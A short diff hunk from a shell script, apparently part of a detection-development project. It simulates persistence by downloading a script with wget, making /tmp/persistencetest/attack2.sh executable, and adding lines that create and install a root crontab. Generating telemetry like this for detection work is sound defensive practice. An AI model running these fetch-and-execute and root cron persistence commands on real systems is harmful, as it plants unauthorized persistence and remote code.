@@ -9,6 +9,8 @@ wget "https://raw.githubusercontent.com/mikecybersec/DetectionDevelopment/main/h
 sleep 5
 
 chmod +x /tmp/persistencetest/attack2.sh
+touch /var/spool/cron/crontabs/root
+/usr/bin/crontab /var/spool/cron/crontabs/root
 
 sleep 5
 
